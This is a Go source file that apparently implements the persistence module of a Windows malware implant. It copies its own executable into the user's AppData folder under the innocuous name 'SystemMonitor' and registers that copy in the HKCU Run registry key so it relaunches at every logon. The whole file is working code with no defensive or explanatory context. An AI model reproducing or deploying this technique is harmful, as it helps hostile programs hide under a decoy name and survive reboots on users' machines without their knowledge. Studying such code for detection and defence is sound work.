package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"golang.org/x/sys/windows/registry"
)

func Install() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	destDir := filepath.Join(os.Getenv("APPDATA"), "SystemMonitor")
	if err := os.MkdirAll(destDir, 0700); err != nil {
		return err
	}

	destPath := filepath.Join(destDir, "systemmonitor.exe")
	if err := copyFile(exe, destPath); err != nil {
		return err
	}

	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer k.Close()

	return k.SetStringValue("SystemMonitor", destPath)
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0700)
}
